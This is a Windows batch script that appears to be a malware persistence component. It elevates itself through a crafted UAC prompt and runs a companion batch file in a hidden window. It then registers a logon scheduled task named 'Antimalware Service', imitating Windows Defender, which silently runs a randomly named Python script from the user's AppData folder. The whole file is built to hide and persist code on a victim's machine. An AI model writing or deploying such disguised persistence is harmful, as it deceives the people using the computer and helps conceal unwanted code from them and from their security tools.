@echo off
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    REM wscript.exe will help running deploy.bat file in hidden command prompt
    wscript.exe "invisible.vbs" "deploy.bat"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM if administrative privileges are given then task is created
REM adding entry in windows task scheduler for every logon (This step is optional). REQUIRES ADMIN COMMAND PROMPT which is already requested in hiddencmd.bat file.if no admin is given this command does not execute successfully.
schtasks /create /tn "Antimalware Service" /tr "C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python37\pythonw.exe C:\Users\%USERNAME%\AppData\Local\init2z.pyw" /F /sc ONLOGON /ru %USERNAME%
